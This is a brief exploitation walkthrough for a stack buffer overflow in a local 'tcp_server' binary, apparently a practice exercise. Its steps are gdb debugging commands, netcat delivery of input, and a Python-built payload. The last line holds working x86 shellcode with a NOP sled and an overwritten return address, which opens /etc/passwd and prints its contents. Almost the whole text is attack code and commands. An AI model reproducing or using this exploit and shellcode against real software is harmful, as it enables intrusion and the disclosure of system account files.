Read /etc/passwd file from tcp server host !!

Debug ELF file 
	
    gdb -q tcp_server

Set a Breakpoint before vuln_read's printf input function to display EIP,ESP etc.

	b *0x80486d7

#Run program with a custom port number 

	r 12345

Bind that port with netcat and send data

	nc 127.0.0.1 12345

Check ESP, STACK to determine payload's position in Stack

	x/1000x $esp

Continue debugging

	c

Set a payload with python to overwrite EIP

	python -c "print('A'*1024+'B'*20+'C'*30)" > payload

	nc 127.0.0.1 12345 < payload 

Check EIP value with program debugging

Everytime that you ll try  you need to restart tcp_server with gdb 

	python -c "print('\x90'*886+'\x31\xc9\x31\xc0\x31\xd2\x51\xb0\x05\x68\x73\x73\x77\x64\x68\x63\x2f\x70\x61\x68\x2f\x2f\x65\x74\x89\xe3\xcd\x80\x89\xd9\x89\xc3\xb0\x03\x66\xba\xff\x0f\x66\x42\xcd\x80\x31\xc0\x31\xdb\xb3\x01\xb0\x04\xcd\x80\x31\xc0\xb0\x01\xcd\x80'+'\x90'*100+'\x70\xcd\xff\xff')"
